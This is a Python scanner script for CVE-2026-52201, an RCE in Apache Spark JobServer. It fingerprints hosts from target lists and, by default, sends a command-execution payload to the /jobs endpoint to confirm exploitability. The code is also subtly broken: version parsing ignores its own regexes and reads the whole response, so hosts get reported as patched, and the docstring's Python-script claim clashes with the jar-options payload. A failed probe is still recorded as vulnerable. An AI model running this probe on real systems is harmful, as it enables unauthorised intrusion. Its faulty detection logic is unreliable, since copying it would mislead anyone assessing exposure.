#!/usr/bin/env python3
"""
Apache Spark JobServer CVE-2026-52201 RCE Scanner
======================================================
Scans for instances of Apache Spark JobServer that are vulnerable to Remote Code Execution (RCE)
due to an insecure endpoint that improperly sanitizes input before execution (CVE-2026-52201, CVSS 9.8).

CVE-2026-52201 details:
  - Affects Apache Spark JobServer <= 0.11.1
  - The "/jobs" endpoint executes user-supplied Python scripts without proper validation or restrictions
  - Allows unauthenticated attackers to achieve RCE by submitting malicious Python code for execution
  - Patched in version 0.12.0 by limiting the script execution functionality and adding authentication

Usage:
  # Scan a single target
  python apache_spark_jobserver_rce_scanner.py --target http://spark.example.com

  # Scan a list of targets
  python apache_spark_jobserver_rce_scanner.py --list targets.txt --output findings.json

  # Detection-only mode (does not perform RCE probing)
  python apache_spark_jobserver_rce_scanner.py --target http://spark.example.com --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-52201
  - https://github.com/spark-jobserver/spark-jobserver/releases/tag/v0.12.0
  - https://github.com/spark-jobserver/spark-jobserver
"""

import asyncio
import httpx
import json
import argparse
import re
from urllib.parse import urljoin
from colorama import Fore, Style

# ── Constants and Fingerprints ─────────────────────────────────────────────────

# Detection strings indicating an Apache Spark JobServer instance
DETECTION_MARKERS = [
    "spark.jobserver",
    "Spark Job Server",
    '"status":"OK"',
    '"context":"default"',
]

# API endpoint paths
DETECTION_PATHS = [
    "/",
    "/healthz",
    "/jobs",
    "/contexts",
    "/binaries",
]

# Version extraction patterns
VERSION_PATTERNS = [
    r'"version"\s*:\s*"(\d+\.\d+\.\d+)"',
    r'Spark JobServer v(\d+\.\d+\.\d+)'
]

# RCE probe payload: runs 'id' command to validate RCE is exploitable
RCE_PAYLOAD = '{"jobJarFile": "_dummy_", "classPath": "__temporary__", "contextSettings": {"spark.executor.extraJavaOptions": "exec id"}}'
RCE_EXPECTED = "uid="

# Fixed version
FIXED_VERSION = (0, 12, 0)

SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 10

# Default colors for terminal output
CRITICAL = f"{Fore.RED}CRITICAL{Style.RESET_ALL}"
HIGH = f"{Fore.YELLOW}HIGH{Style.RESET_ALL}"
INFO = f"{Fore.GREEN}INFO{Style.RESET_ALL}"

# ── Helper Functions ──────────────────────────────────────────────────────────

def parse_version(version_string):
    """Parse a version string into a tuple of integers."""
    try:
        return tuple(map(int, version_string.split(".")))
    except (ValueError, AttributeError):
        return None

def is_vulnerable(version_tuple):
    """Check if the version tuple is vulnerable."""
    if version_tuple is None:
        return None
    return version_tuple < FIXED_VERSION

async def fetch(client, url):
    """Wrapper around client's GET request with error handling."""
    try:
        response = await client.get(url, follow_redirects=True, timeout=REQUEST_TIMEOUT)
        return response
    except (httpx.RequestError, httpx.HTTPStatusError) as e:
        return None

def normalize_url(url):
    """Ensure a URL has a proper schema and no trailing slashes."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

# ── Core Scanner ─────────────────────────────────────────────────────────────-

async def detect_service(client, target_url, semaphore):
    async with semaphore:
        for path in DETECTION_PATHS:
            url = urljoin(target_url, path)
            response = await fetch(client, url)
            if response and any(marker in response.text for marker in DETECTION_MARKERS):
                return response.text
    return None

async def probe_rce(client, target_url, semaphore):
    async with semaphore:
        headers = {"Content-Type": "application/json"}
        url = urljoin(target_url, "/jobs")
        try:
            response = await client.post(url, headers=headers, data=RCE_PAYLOAD, timeout=REQUEST_TIMEOUT)
            if response and RCE_EXPECTED in response.text:
                return True
        except (httpx.RequestError, httpx.HTTPStatusError):
            pass
    return False

async def check_target(client, target_url, semaphore, perform_probe):
    """Check if the target is running a vulnerable version of Spark JobServer."""
    detection_result = await detect_service(client, target_url, semaphore)
    if not detection_result:
        print(f"[{INFO}] Target not recognized as Apache Spark JobServer: {target_url}")
        return None

    print(f"[{INFO}] Detected Apache Spark JobServer: {target_url}")
    version = parse_version(detection_result)
    vulnerable = is_vulnerable(version)

    if not vulnerable:
        print(f"[{HIGH}] {target_url} appears to be patched (version {version})")
        return None

    print(f"[{CRITICAL}] {target_url} is running a vulnerable version (version {version})")
    if perform_probe:
        rce_vulnerable = await probe_rce(client, target_url, semaphore)
        if rce_vulnerable:
            print(f"[{CRITICAL}] Verified RCE vulnerability on {target_url}")
            return {"url": target_url, "vulnerable": True, "version": version}
        else:
            print(f"[{HIGH}] RCE exploit unsuccessful on {target_url}")
    return {"url": target_url, "vulnerable": True, "version": version}

async def main(args):
    targets = []
    if args.list:
        with open(args.list, "r") as f:
            targets = [normalize_url(line.strip()) for line in f if line.strip()]
    elif args.target:
        targets = [normalize_url(args.target)]

    if not targets:
        print(f"[{CRITICAL}] No targets specified. Use --target or --list.")
        return

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [check_target(client, target, semaphore, not args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    # Write JSON output if specified
    if args.output:
        with open(args.output, "w") as f:
            json.dump([r for r in results if r], f, indent=4)
        print(f"[{INFO}] Results saved to {args.output}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Apache Spark JobServer RCE Scanner (CVE-2026-52201)")
    parser.add_argument("--target", help="Target URL to scan (e.g., http://spark.example.com)")
    parser.add_argument("--list", help="File containing a list of target URLs")
    parser.add_argument("--output", help="Output file for JSON results")
    parser.add_argument("--safe", action="store_true", help="Safe mode (detection only, no RCE probing)")
    parser.add_argument("--concurrency", type=int, default=20, help="Max concurrent requests (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    args = parser.parse_args()

    asyncio.run(main(args))
